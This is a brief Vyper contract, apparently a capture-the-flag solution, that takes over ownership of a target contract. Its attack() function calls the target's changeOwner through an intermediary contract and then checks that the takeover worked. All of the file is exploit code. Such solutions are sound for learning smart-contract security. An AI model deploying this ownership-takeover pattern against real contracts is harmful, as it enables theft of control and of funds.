# @version ^0.3.7

interface InstanceInterface:
    def owner() -> address: view
    def changeOwner(_owner: address): nonpayable

owner: immutable(address)

instance: InstanceInterface

@external
@payable
def __init__(_instance: InstanceInterface):
    owner = msg.sender
    self.instance = _instance

@external
def attack():
    assert msg.sender == owner, "!owner"
    self.instance.changeOwner(owner)
    assert self.instance.owner() == owner, "!passed"
